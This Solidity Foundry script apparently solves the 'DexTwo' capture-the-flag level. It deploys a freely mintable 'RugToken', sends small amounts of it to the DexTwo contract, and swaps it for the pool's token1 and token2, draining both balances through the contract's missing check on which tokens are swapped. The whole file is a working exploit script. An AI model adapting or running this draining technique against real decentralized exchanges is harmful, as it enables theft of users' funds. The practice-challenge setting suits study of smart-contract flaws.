// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {DexTwo} from "../src/DexTwo.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract RugToken is ERC20, Ownable {
    constructor() ERC20("New Token", "NT") Ownable(msg.sender) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract HackDexTwoScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        DexTwo dexTwo = helperConfig.getDexTwoConfig().dexTwo;
        ERC20 token1 = ERC20(dexTwo.token1());
        ERC20 token2 = ERC20(dexTwo.token2());
        console.log("Token1 balance: ", token1.balanceOf(address(dexTwo)));
        console.log("Token2 balance: ", token2.balanceOf(address(dexTwo)));

        vm.startBroadcast();
        RugToken rugToken = new RugToken();
        rugToken.mint(msg.sender, 1000000 ether);
        token1.approve(address(dexTwo), 1000000 ether);
        token2.approve(address(dexTwo), 1000000 ether);
        rugToken.approve(address(dexTwo), 1000000 ether);

        rugToken.transfer(address(dexTwo), 1);
        dexTwo.swap(address(rugToken), address(token1), 1);
        console.log("Token1 balance: ", token1.balanceOf(address(dexTwo)));
        console.log("Token2 balance: ", token2.balanceOf(address(dexTwo)));
        console.log("RugToken balance: ", rugToken.balanceOf(address(dexTwo)));
        rugToken.transfer(address(dexTwo), 1);
        dexTwo.swap(address(rugToken), address(token2), rugToken.balanceOf(address(dexTwo)));
        console.log("Token1 balance: ", token1.balanceOf(address(dexTwo)));
        console.log("Token2 balance: ", token2.balanceOf(address(dexTwo)));
        console.log("RugToken balance: ", rugToken.balanceOf(address(dexTwo)));
        vm.stopBroadcast();
    }
}
